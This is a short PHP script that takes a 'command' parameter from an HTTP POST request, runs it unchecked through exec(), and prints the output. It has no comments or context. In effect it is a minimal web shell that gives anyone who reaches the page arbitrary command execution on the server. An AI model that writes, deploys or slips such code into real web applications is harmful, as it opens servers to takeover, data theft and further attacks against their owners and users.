<?php
	$input = $_POST["input"];
	$command = $_POST["command"];

	exec($command.' 2>&1', $output, $return_value);
	foreach($output as $line){
		echo $line."\n";
	}
?>